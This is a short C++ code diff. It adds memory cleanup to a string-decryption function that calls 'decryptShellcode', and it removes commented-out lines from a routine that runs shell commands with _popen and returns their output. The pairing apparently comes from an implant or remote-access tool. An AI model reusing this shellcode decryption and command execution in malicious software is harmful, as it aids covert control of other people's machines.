@@ -17,6 +17,9 @@ string fin_dec(string enc_str, int key) {
 	unsigned char* decrypted_tab = decryptShellcode(encrypted_tab, data_len, key);
 	string dec_str = reinterpret_cast<char*>(decrypted_tab);
 
+	delete[] encrypted_tab;
+	delete[] decrypted_tab;
+
 	return dec_str;
 }
 
@@ -81,13 +84,6 @@ string exe_command(const string &command) {
 		_pclose(fp);
 		throw;
 	}
-
-	// fp = _popen(command.c_str(), "r");
-	// while (fgets(container, 4096, fp) != NULL) {
-	// 	strcat(total_response, container);
-	// }
-
-	// _pclose(fp);
 
 	return total_response;
 }
